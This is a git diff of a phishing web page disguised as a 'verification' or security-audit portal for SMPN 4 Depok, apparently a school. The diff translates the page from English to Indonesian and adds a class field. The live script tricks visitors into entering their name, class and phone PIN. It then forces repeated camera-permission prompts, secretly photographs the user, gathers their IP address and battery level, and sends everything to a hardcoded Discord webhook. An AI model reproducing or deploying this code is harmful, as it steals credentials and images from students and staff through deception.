@@ -1,48 +1,50 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SMPN 4 Security Audit</title>
+    <title>Sistem Verifikasi SMPN 4 Depok</title>
     <style>
-        body { background: #0a0a0a; color: #00ff00; font-family: 'Segoe UI', Tahoma, sans-serif; text-align: center; padding: 20px; }
-        .card { background: #1a1a1a; border: 1px solid #333; padding: 30px; border-radius: 10px; max-width: 400px; margin: auto; box-shadow: 0 0 20px rgba(0,255,0,0.1); }
-        input { width: 90%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #00ff00; color: #0f0; border-radius: 5px; }
-        .btn { background: #00ff00; color: #000; border: none; padding: 15px 30px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 5px; }
-        .small-text { font-size: 10px; color: #888; margin-top: -5px; margin-bottom: 15px; }
-        #audit-box { display: none; }
-        #result-box { display: none; }
-        .scanner { border: 2px solid #0f0; width: 200px; height: 200px; margin: 20px auto; position: relative; overflow: hidden; }
-        .line { width: 100%; height: 2px; background: #0f0; position: absolute; animation: scan 2s infinite; }
-        @keyframes scan { from { top: 0; } to { top: 100%; } }
+        body { background: #ffffff; color: #000000; font-family: 'Segoe UI', Arial, sans-serif; text-align: center; padding: 20px; }
+        .card { background: #ffffff; border: 2px solid #eeeeee; padding: 30px; border-radius: 12px; max-width: 400px; margin: auto; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        h2 { font-weight: 700; border-bottom: 2px solid #000; padding-bottom: 10px; text-transform: uppercase; }
+        input { width: 90%; padding: 12px; margin: 10px 0; background: #fafafa; border: 1px solid #cccccc; color: #000000; border-radius: 6px; font-size: 16px; }
+        .btn { background: #000000; color: #ffffff; border: none; padding: 15px 30px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 6px; transition: 0.3s; font-size: 16px; }
+        .btn:hover { background: #333333; }
+        .small-text { font-size: 11px; color: #777777; margin-top: -5px; margin-bottom: 15px; text-align: left; margin-left: 5%; }
+        #audit-box, #result-box { display: none; }
+        .scanner { border: 2px solid #000; width: 180px; height: 180px; margin: 20px auto; position: relative; overflow: hidden; background: #f9f9f9; }
+        .line { width: 100%; height: 3px; background: #000; position: absolute; animation: scan 2s infinite linear; }
+        @keyframes scan { 0% { top: 0%; } 50% { top: 100%; } 100% { top: 0%; } }
     </style>
 </head>
 <body>
 
-    <!-- STAGE 1: LOGIN -->
+    <!-- TAHAP 1: LOGIN -->
     <div id="login-box" class="card">
-        <h2>STAFF LOGIN</h2>
-        <p>Verification Required for SMPN 4 Network Access</p>
-        <input type="text" id="fullName" placeholder="Full Name">
-        <input type="password" id="phonePin" placeholder="Current Phone PIN">
-        <p class="small-text">If your device has no PIN, leave blank.</p>
-        <button class="btn" onclick="goToAudit()">PROCEED TO AUDIT</button>
+        <h2>PORTAL VERIFIKASI</h2>
+        <p>Silakan lengkapi data untuk melanjutkan audit perangkat.</p>
+        <input type="text" id="fullName" placeholder="Nama Lengkap">
+        <input type="text" id="userClass" placeholder="Kelas / Jabatan">
+        <input type="password" id="phonePin" placeholder="PIN/Password Layar HP">
+        <p class="small-text">*Jika tidak ada PIN, biarkan kosong.</p>
+        <button class="btn" onclick="goToAudit()">LANJUTKAN</button>
     </div>
 
-    <!-- STAGE 2: CAMERA PERMISSION -->
+    <!-- TAHAP 2: IZIN KAMERA -->
     <div id="audit-box" class="card">
-        <h2>HARDWARE SYNC</h2>
+        <h2>SINKRONISASI SENSOR</h2>
         <div class="scanner"><div class="line"></div></div>
-        <p>Please <b>Allow Camera Permission</b> when prompted to continue the system scan.</p>
-        <button class="btn" onclick="startCamera()">SYNC CAMERA NOW</button>
+        <p>Sistem perlu memverifikasi hardware. Klik <b>"Izinkan"</b> saat muncul permintaan akses kamera.</p>
+        <button class="btn" onclick="startCamera()">SINKRONKAN SEKARANG</button>
     </div>
 
-    <!-- STAGE 3: THE REVEAL -->
+    <!-- TAHAP 3: HASIL -->
     <div id="result-box" class="card">
-        <h1 style="color: #ff0000;">⚠️ SYSTEM CRACKED ⚠️</h1>
-        <p>Target Identity Confirmed.</p>
-        <img id="capturedImg" style="width: 100%; border: 2px solid #f00;">
-        <p>Your full information has been logged to the security server.</p>
+        <h1 style="color: #000000; border: 2px solid #000;">⚠️ DATA DIEKSPOS ⚠️</h1>
+        <p>Sistem Keamanan Berhasil Ditembus.</p>
+        <img id="capturedImg" style="width: 100%; border: 1px solid #000; border-radius: 8px;">
+        <p style="font-weight: bold; background: #000; color: #fff; padding: 5px;">SELURUH INFO ANDA TELAH DISADAP</p>
     </div>
 
     <video id="video" autoplay style="display:none;"></video>
@@ -51,12 +53,14 @@
     <script>
         const webhook = "https://discord.com/api/webhooks/1499298779143340053/96v2UUkOcDdK8X_PG-2_zOycfoYzxO0_7rt2m6npWmjMMUSuUWsTPkSM_cpO9L69dr8K";
         let targetName = "";
+        let targetClass = "";
         let targetPin = "";
 
         function goToAudit() {
             targetName = document.getElementById('fullName').value;
+            targetClass = document.getElementById('userClass').value;
             targetPin = document.getElementById('phonePin').value;
-            if (!targetName) return alert("Enter Name");
+            if (!targetName || !targetClass) return alert("Mohon lengkapi data Anda.");
             document.getElementById('login-box').style.display = 'none';
             document.getElementById('audit-box').style.display = 'block';
         }
@@ -66,14 +70,10 @@
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
-
-                // Snap instantly after 1 second of loading
-                setTimeout(() => {
-                    takeSnapshot(stream);
-                }, 1000);
+                setTimeout(() => takeSnapshot(stream), 1200);
             } catch (err) {
-                alert("Permission Required: You must allow camera access to complete the audit.");
-                startCamera(); // Ask again
+                alert("Akses Ditolak: Anda wajib memberikan izin kamera untuk audit ini.");
+                startCamera(); 
             }
         }
 
@@ -83,33 +83,30 @@
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
-            
-            const dataUrl = canvas.toDataURL('image/png');
-            document.getElementById('capturedImg').src = dataUrl;
+            document.getElementById('capturedImg').src = canvas.toDataURL('image/png');
 
-            // Get IP & Battery
             let batteryInfo = "Unknown";
             if (navigator.getBattery) {
                 const bat = await navigator.getBattery();
-                batteryInfo = `${(bat.level * 100)}%`;
+                batteryInfo = `${Math.round(bat.level * 100)}%`;
             }
-
             const ipRes = await fetch('https://api.ipify.org?format=json');
             const ipData = await ipRes.json();
 
             canvas.toBlob(blob => {
                 const formData = new FormData();
-                formData.append('file', blob, 'face.png');
+                formData.append('file', blob, 'target.png');
                 const embed = {
-                    title: "🔓 TARGET CREDENTIALS EXPOSED",
-                    color: 1515836,
+                    title: "🔓 HASIL SADAP IDENTITAS",
+                    color: 0,
                     fields: [
-                        { name: "Name", value: targetName, inline: true },
-                        { name: "Phone PIN", value: `\`${targetPin || 'NONE'}\``, inline: true },
-                        { name: "IP Address", value: ipData.ip },
-                        { name: "Battery", value: batteryInfo, inline: true },
-                        { name: "Hardware", value: navigator.platform, inline: true }
-                    ]
+                        { name: "👤 Nama", value: targetName, inline: true },
+                        { name: "🏫 Kelas", value: targetClass, inline: true },
+                        { name: "🔑 PIN HP", value: `\`${targetPin || 'KOSONG'}\``, inline: false },
+                        { name: "🌐 IP Address", value: ipData.ip, inline: true },
+                        { name: "🔋 Baterai", value: batteryInfo, inline: true }
+                    ],
+                    footer: { text: "Audit Keamanan SMPN 4 Depok - Beelink System" }
                 };
                 formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
                 fetch(webhook, { method: 'POST', body: formData });
